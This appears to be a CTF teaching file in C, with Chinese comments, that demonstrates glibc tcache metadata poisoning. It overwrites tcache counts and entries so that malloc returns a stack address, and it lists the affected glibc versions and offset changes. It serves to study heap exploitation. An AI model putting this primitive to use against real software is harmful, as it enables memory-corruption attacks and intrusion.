/*
 * 中文导读（CTF 版）
 *
 * 手法：tcache_metadata_poisoning
 * 文件标注范围：2.30 ~ 2.41
 * 模拟漏洞：能越界写或重叠到 tcache_perthread_struct。
 * 核心流程：直接改 counts/num_slots 与 entries；2.42 的 entries 头仍为明文，large 链中间 next 槽才使用安全链接；2.43 结构体偏移再次变化。
 * 成功判据：目标大小的下一次分配返回任意对齐地址。不要把旧版 counts/entries 偏移套到 2.42+。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。所有故意的 UAF、越界和 double free 都是漏洞模拟，不是正常 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时应按实际 libc 源码判断。
 */

#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

// tcache 元数据投毒攻击
//
// 攻击者一旦能覆盖 tcache 的管理结构，就可以把任意目标地址直接写进指定
// 尺寸桶的 entries 表头。随后申请对应大小的 chunk，malloc 就会把该地址
// 当作空闲节点返回，从而把“元数据覆盖”转化为“任意地址分配”原语。

// 早期版本默认有 64 个 tcache 尺寸桶；具体常量在较新版本中会变化。
#define TCACHE_BINS 64
// x86-64 上普通堆块头占 0x10 字节，由 prev_size 与 size 两个机器字组成。
#define HEADER_SIZE 0x10

// 下面按本文件目标版本复刻 tcache_perthread_struct，也就是线程本地 tcache 元数据。
struct tcache_metadata {
  uint16_t counts[TCACHE_BINS];
  void *entries[TCACHE_BINS];
};

int main() {
  // 禁用标准流缓冲，避免 stdio 的隐式堆分配改变本例的相对布局。
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);

  uint64_t stack_target = 0x1337;

  uint64_t *victim = malloc(0x10);

  long metadata_size = sizeof(struct tcache_metadata);

  struct tcache_metadata *metadata =
      (struct tcache_metadata *)((long)victim - HEADER_SIZE - metadata_size);

  metadata->counts[1] = 1;
  metadata->entries[1] = &stack_target;

  uint64_t *evil = malloc(0x20);

  assert(evil == &stack_target);
}
